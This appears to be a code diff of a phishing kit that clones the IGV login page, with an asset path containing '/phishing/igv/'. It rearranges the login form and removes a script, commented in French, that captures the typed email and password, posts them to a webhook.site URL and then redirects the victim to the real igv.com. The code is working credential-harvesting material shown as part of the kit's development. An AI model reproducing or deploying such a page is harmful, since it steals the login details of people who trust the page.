@@ -3951,7 +3951,6 @@
         <!---->
         <main data-v-49b52969>
           <!--[-->
-          <form id="login-form">
             <div class="login-wrapper en" data-v-978ec31a>
               <img style="position:absolute;object-fit:cover;width:100%;height:100%;overflow:hidden;" src="/phishing/igv/login-bg-en.2a4e3947.jpg" alt="login-background-img" data-v-978ec31a>
               <div class="login-top" data-v-978ec31a>
@@ -3969,6 +3968,7 @@
                         <!---->
                         <!--[-->
                         <!--]-->
+	                <form id="login-form">
                         <div class="input-box" data-v-9fb00192>
                           <span style="" class="placeholder" data-v-9fb00192 id="email-placeholder">Email</span>
                           <input aria-label="" id="email" class="inner-input" type="text" value="" autocomplete="off" data-v-9fb00192>
@@ -3987,7 +3987,6 @@
                         <div class="input-box" data-v-9fb00192>
                           <span style="" class="placeholder" data-v-9fb00192 id="password-placeholder">Password</span>
                           <input aria-label="" id="password" class="inner-input" type="password" value="" autocomplete="off" data-v-9fb00192>
-          </form>
       </div>
       <!--[-->
       <!--]-->
@@ -4024,6 +4023,7 @@
       <!--[-->Log in
       <!--]-->
     </button>
+		    </form>
     <div style="display:none;" class="dialog-wrapper" data-v-8fd8cb2d data-v-04b68c90 data-v-b10a479a>
       <div class="common-dialog" data-v-b10a479a>
         <div class="dialog-top" data-v-b10a479a>
@@ -8085,34 +8085,6 @@
         } else {
           console.error('Password input or placeholder not found!');
         }
-      });
-    </script>
-    <script>
-      document.getElementById('login-form').addEventListener('submit', function(event) {
-        event.preventDefault(); // Empêche l'envoi du formulaire
-        // Récupérer les valeurs des champs d'entrée
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        // Créer un objet avec les données à envoyer
-        const data = {
-          email: email,
-          password: password
-        };
-        // Effectuer la requête POST vers le webhook
-        fetch('https://webhook.site/ed57f353-a14b-4fcf-b2e0-2ba38fbbd7b0', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(data)
-        }).then(response => {
-          // On redirige peu importe le résultat de la connexion
-          window.location.href = 'https://igv.com';
-        }).catch(error => {
-          console.error('Erreur de réseau:', error);
-          // Redirection même en cas d'échec
-          window.location.href = 'https://igv.com';
-        });
       });
     </script>
   </body>
